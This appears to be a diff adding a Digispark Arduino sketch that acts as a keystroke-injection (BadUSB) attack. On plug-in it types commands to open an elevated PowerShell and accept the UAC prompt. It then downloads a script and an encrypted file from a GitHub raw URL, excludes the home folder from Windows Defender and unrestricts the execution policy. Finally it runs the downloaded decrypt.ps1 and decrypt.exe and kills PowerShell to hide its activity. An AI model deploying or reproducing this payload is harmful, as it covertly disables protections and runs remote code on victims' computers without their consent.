@@ -1,0 +1,39 @@
+#include "DigiKeyboard.h"
+void setup() {
+DigiKeyboard.update();
+DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+DigiKeyboard.delay(1000);
+DigiKeyboard.println(F("Powershell"));
+DigiKeyboard.delay(1500);
+DigiKeyboard.println("Start-Process powershell -Verb RunAs");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.println("Invoke-WebRequest -Uri https://raw.githubusercontent.com/AidanAma/Powershell/main/decrypt.txt -OutFile $HOME/decrypt.ps1");
+DigiKeyboard.delay(1000);
+DigiKeyboard.println("Invoke-WebRequest -Uri https://raw.githubusercontent.com/AidanAma/Powershell/main/fff.cpt -outFile $HOME/fff.cpt");
+DigiKeyboard.delay(1500);
+DigiKeyboard.println("Set-MpPreference -ExclusionPath $HOME");
+DigiKeyboard.delay(1000);
+DigiKeyboard.println("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(4);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.println("cd $HOME");
+DigiKeyboard.delay(1000);
+DigiKeyboard.println("./decrypt.ps1");
+DigiKeyboard.delay(1000);
+DigiKeyboard.println(F("Start-Process -FilePath $HOME/decrypt.exe"));
+DigiKeyboard.delay(1000);
+DigiKeyboard.println(F("Get-Process -Name powershell | Stop-Process -Force"));
+
+}
+
+void loop() {
+  
+}
